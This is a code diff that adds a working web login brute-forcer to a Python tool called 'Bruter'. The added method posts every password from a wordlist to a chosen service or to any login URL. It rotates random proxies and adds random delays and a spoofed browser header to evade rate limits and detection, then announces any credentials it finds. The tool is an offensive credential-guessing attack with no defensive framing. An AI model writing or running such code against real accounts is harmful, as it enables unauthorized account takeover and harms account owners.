@@ -4,6 +4,8 @@ import requests
 import argparse
 import os
 from requests.exceptions import RequestException, Timeout
+import sys
+import random
 
 avoidance_patterns = [
     r"^[0-9]+$",  # Avoid using all numeric passwords
@@ -95,8 +97,115 @@ class Bruter:
             print(f"[Warning] Error checking username: {str(e)}")
             return 0
 
+    def get_random_proxy(self):
+        try:
+            proxy = random.choice(self.proxies)
+            return {
+                'http': proxy,
+                'https': proxy
+            }
+        except IndexError:
+            if self.verbose:
+                print("[Warning] No proxies available, continuing without proxy")
+            return None
+
+
     def webBruteforce(self, username, wordlist, service, delay):
-        pass
+        if service.startswith('http'):
+            target_url = service
+            is_custom = True
+        else:
+            if service not in self.service_configs:
+                print(f"[Error] Unsupported service: {service}")
+                print("Available services:", ', '.join(self.service_configs.keys()))
+                print("Or use full URL (e.g., https://example.com/login)")
+                exit(1)
+            target_url = self.service_configs[service]['url']
+            is_custom = False
+
+        with open(wordlist, "r") as f:
+            passwords = f.readlines()
+            total_passwords = len(passwords)
+
+            for password in passwords:
+                self.attempts += 1
+                password = password.strip()
+
+                # bar
+                progress = int((self.attempts / total_passwords) * 30)
+                sys.stdout.write('\r\033[K')
+                sys.stdout.write(
+                    f"\033[96m[{'=' * progress}{' ' * (30 - progress)}] {self.attempts}/{total_passwords}\033[0m")
+                sys.stdout.flush()
+
+                try:
+                    proxies = self.get_random_proxy()
+                    time.sleep(random.uniform(delay, delay * 2))
+
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': 'application/json, text/plain, */*',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Origin': target_url,
+                        'Connection': 'keep-alive',
+                    }
+
+                    if is_custom:
+                        data = {
+                            'username': username,
+                            'email': username,
+                            'user': username,
+                            'password': password,
+                            'pass': password,
+                            'passwd': password
+                        }
+                    else:
+                        data = self.service_configs[service]['data'](username, password)
+
+                    r = self.session.post(
+                        target_url,
+                        data=data,
+                        headers=headers,
+                        proxies=proxies if proxies else None,
+                        allow_redirects=True,
+                        timeout=10
+                    )
+
+                    print(f"HTTP {r.status_code} | Password: {password} | Size: {len(r.text):,} bytes\033[0m")
+
+                    if 'location' in r.headers:
+                        print(f"\033[94m[→] Redirect: {r.headers['location']}\033[0m")
+
+                    if is_custom:
+                        success = any([
+                            'dashboard' in r.url,
+                            'welcome' in r.url,
+                            'home' in r.url,
+                            'success' in r.text.lower(),
+                            'welcome' in r.text.lower(),
+                            r.status_code == 302
+                        ])
+                    else:
+                        success = self.service_configs[service]['success'](r)
+
+                    if success:
+                        print(f"""
+                    \033[92m╔══════════════════ SUCCESS ══════════════════╗
+                    ║ Password Found!                              ║
+                    ║ Username: {username:<35} ║
+                    ║ Password: {password:<35} ║
+                    ║ Attempts: {self.attempts:<35} ║
+                    ║ Time: {time.time() - self.start_time:.2f} seconds{' ' * 27} ║
+                    ╚═════════════════════════════════════════════╝\033[0m
+                                            """)
+                        return True
+                except RequestException as e:
+                    print(f"\n\033[91m[✗] Error: {str(e)} | Password: {password}\033[0m")
+                    if proxies:
+                        print(f"\033[91m[!] Failed Proxy: {proxies['http']}\033[0m")
+                    continue
+        return False
 
     def execute(self):
         if self.usercheck(self.username) == 1:
